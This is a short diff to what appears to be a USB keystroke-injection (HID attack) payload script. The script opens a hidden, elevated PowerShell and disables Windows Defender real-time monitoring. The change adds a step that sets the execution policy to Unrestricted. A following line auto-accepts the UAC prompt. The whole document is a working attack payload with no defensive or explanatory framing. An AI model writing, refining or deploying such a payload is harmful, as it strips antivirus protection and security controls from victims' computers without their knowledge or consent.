@@ -2,7 +2,7 @@
 LED R SLOW
 ATTACKMODE HID
 QUCK DELAY 2000
-RUN WIN powershell -windowstyle hidden Start-Process powershell -Verb runAs -argument "'-windowstyle hidden -NoProfile -Command Set-MpPreference -DisableRealtimeMonitoring 1;'"
+RUN WIN powershell -windowstyle hidden Start-Process powershell -Verb runAs -argument "'-windowstyle hidden -NoProfile -Command Set-MpPreference -DisableRealtimeMonitoring 1;', 'Set-ExecutionPolicy Unrestricted'"
 
 QUACK DELAY 1000
 QUACK ALT y
